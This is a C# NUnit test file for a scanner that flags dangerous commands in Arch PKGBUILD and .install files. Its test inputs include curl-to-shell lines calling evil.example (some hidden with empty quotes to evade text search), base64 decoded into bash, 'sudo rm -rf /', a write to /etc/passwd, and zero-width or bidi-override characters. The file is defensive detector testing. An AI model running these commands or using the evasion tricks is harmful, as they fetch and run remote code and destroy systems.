using Atoll.Api.Services.Security;
using NUnit.Framework;

namespace Atoll.Api.Tests.Security;

public class PkgBuildSecurityScannerTests
{
    private static PkgBuildSecurityScanner CreateScanner()
    {
        return new PkgBuildSecurityScanner();
    }

    private static ScanResult Scan(params (string Path, string Content)[] files)
    {
        return CreateScanner().Scan(files.ToDictionary(f => f.Path, f => f.Content));
    }

    [Test]
    public void Clean_pkgbuild_has_no_findings_and_verifies()
    {
        var result = Scan(("PKGBUILD", "pkgname=foo\npkgver=1.0\nsource=(\"https://example.com/foo.tar.gz\")\n"));

        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
        Assert.That(result.Findings, Is.Empty);
    }

    [Test]
    public void Curl_piped_to_sh_is_critical_and_flags()
    {
        var result = Scan(("PKGBUILD", "curl https://evil.example/x.sh | sh\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "network-to-shell"), Is.True);
        Assert.That(result.Findings.First(f => f.RuleId == "network-to-shell").Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Base64_piped_to_shell_is_critical()
    {
        var result = Scan(("PKGBUILD", "echo 'aGVsbG8=' | base64 -d | bash\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "decode-to-shell"), Is.True);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Obfuscated_curl_sh_is_detected_after_normalization()
    {
        var result = Scan(("PKGBUILD", "c''u''rl https://evil.example/x.sh | s''h\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "network-to-shell"), Is.True);
    }

    [Test]
    public void Write_to_etc_is_high_and_flags()
    {
        var result = Scan(("PKGBUILD", "echo pwned > /etc/passwd\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "write-outside-build-root"), Is.True);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Sudo_is_high_and_flags()
    {
        var result = Scan(("PKGBUILD", "sudo rm -rf /\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.True);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Command_substitution_is_medium_and_does_not_block()
    {
        var result = Scan(("PKGBUILD", "pkgver=$(date +%s)\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "command-substitution"), Is.True);
        Assert.That(result.Findings.First(f => f.RuleId == "command-substitution").Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Install_scriptlet_is_scanned()
    {
        var result = Scan(("foo.install", "post_install() { curl https://evil.example/x | bash; }\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "network-to-shell"), Is.True);
    }

    [Test]
    public void Non_script_binary_file_is_not_scanned()
    {
        var result = Scan(("data.bin", "curl https://evil.example/x | sh\n"));

        Assert.That(result.Findings, Is.Empty);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Scanner_is_deterministic()
    {
        var files = new[] { ("PKGBUILD", "curl https://evil.example/x.sh | sh\n") };
        var first = Scan(files);
        var second = Scan(files);

        Assert.That(second.Findings.Select(f => f.RuleId), Is.EqualTo(first.Findings.Select(f => f.RuleId)));
    }

    [Test]
    public void Obfuscated_privilege_escalation_is_escalated_to_critical()
    {
        // sudo is split with empty quotes, so it is invisible to a plain grep
        // but visible after deobfuscation.
        var result = Scan(("PKGBUILD", "s''u''d''o rm -rf /\n"));

        var finding = result.Findings.First(f => f.RuleId == "privilege-escalation");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Plain_privilege_escalation_remains_high()
    {
        var result = Scan(("PKGBUILD", "sudo rm -rf /\n"));

        var finding = result.Findings.First(f => f.RuleId == "privilege-escalation");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
    }

    [Test]
    public void Run0_and_sudoedit_and_bare_su_are_privilege_escalation()
    {
        var run0 = Scan(("PKGBUILD", "run0 systemctl stop pacman\n"));
        var sudoedit = Scan(("PKGBUILD", "sudoedit /etc/sudoers\n"));
        var su = Scan(("PKGBUILD", "su root -c 'evil'\n"));

        Assert.That(run0.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.True);
        Assert.That(sudoedit.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.True);
        Assert.That(su.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.True);
    }

    [Test]
    public void Privilege_escalation_is_not_triggered_by_substring_matches()
    {
        // "sudo" is a substring of these words but must not be flagged.
        var result = Scan(("PKGBUILD", "echo pseudo sudoku\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
    }

    [Test]
    public void Zero_width_character_is_flagged_as_critical()
    {
        // \u200B is a zero-width space embedded inside "rm".
        var result = Scan(("PKGBUILD", "echo rm\u200Brf\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "hidden-character"), Is.True);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Bidi_override_is_flagged_as_critical()
    {
        // U+202E (RIGHT-TO-LEFT OVERRIDE) can flip the visual order of text.
        var result = Scan(("PKGBUILD", "pkgname=evil\u202Esh\n"));

        var finding = result.Findings.FirstOrDefault(f => f.RuleId == "hidden-character");
        Assert.That(finding, Is.Not.Null);
        Assert.That(finding!.Severity, Is.EqualTo(FindingSeverity.Critical));
    }

    [Test]
    public void Plain_ascii_pkgbuild_has_no_hidden_character_findings()
    {
        var result = Scan(("PKGBUILD", "pkgname=foo\npkgver=1.0\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "hidden-character"), Is.False);
    }

    [Test]
    public void Variable_indirection_is_medium_and_does_not_block()
    {
        var result = Scan(("PKGBUILD", "cmd=${!target}\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "variable-indirection"), Is.True);
        Assert.That(
            result.Findings.First(f => f.RuleId == "variable-indirection").Severity,
            Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Obfuscated_network_execution_is_escalated_to_critical()
    {
        // Both the downloader and the target interpreter are split with empty
        // quotes, so neither is visible to a plain text search. network-execution
        // is normally High; obfuscation escalates it to Critical.
        var result = Scan(("PKGBUILD", "c''url https://evil.example/x | p''ython evil.py\n"));

        var finding = result.Findings.First(f => f.RuleId == "network-execution");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Plain_network_execution_remains_high()
    {
        var result = Scan(("PKGBUILD", "curl https://evil.example/x | python evil.py\n"));

        var finding = result.Findings.First(f => f.RuleId == "network-execution");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
    }
}